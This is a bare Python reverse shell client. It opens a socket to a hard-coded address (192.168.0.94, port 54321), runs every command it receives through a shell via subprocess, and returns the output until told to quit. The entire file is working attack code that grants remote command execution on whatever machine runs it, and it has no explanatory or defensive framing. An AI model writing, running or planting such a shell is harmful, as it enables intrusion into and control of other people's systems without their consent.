#!/usr/bin/python3
import socket
from termcolor import colored
import subprocess

HOST = '192.168.0.94'
PORT = 54321


def shell(_s):
	while True:
		command = _s.recv(1024)
		if command.decode('UTF-8') == 'q':
			print(colored('[-] Instruction to close sent from the server', 'red'))
			_s.close()
			break
		else:
			proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
									stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			result = proc.stdout.read() + proc.stderr.read()
			_s.send(result)


def client():
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		s.connect((HOST, PORT))
		with s:
			shell(s)


client()
